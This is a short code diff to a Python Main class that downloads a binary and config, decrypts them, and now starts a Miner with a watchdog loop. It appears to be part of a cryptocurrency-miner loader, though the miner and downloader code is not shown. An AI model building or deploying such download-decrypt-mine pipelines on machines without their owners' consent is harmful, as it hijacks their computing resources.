@@ -1,6 +1,7 @@
 from lib.Config import Config
 from lib.Downloader import Downloader
 from lib.Encryptor import Encryptor
+from lib.Miner import Miner
 
 
 class Main:
@@ -12,6 +13,8 @@ class Main:
         binary_path, config_path = self.download()
 
         self.decrypt(binary_path, config_path)
+
+        self.start_mining(binary_path, self.config.poll_interval)
         
 
 
@@ -34,3 +37,8 @@ class Main:
         encryptor.decrypt(config_path)
 
         self.decoded = True
+    
+
+    def start_mining(self, binary_path:str, poll_interval:int = 0.5):
+        miner = Miner(binary_path)
+        miner.watchdog(poll_interval)
